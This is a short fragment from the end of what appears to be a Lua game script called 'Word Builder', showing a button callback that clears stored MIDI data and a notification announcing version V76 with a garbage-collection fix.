        clearMyMidis()
        notify("Builder", "Cleared", 2)
    end
})

notify("Word Builder", "V76 Loaded (Pad 1 Garbage-Collection Fix)")
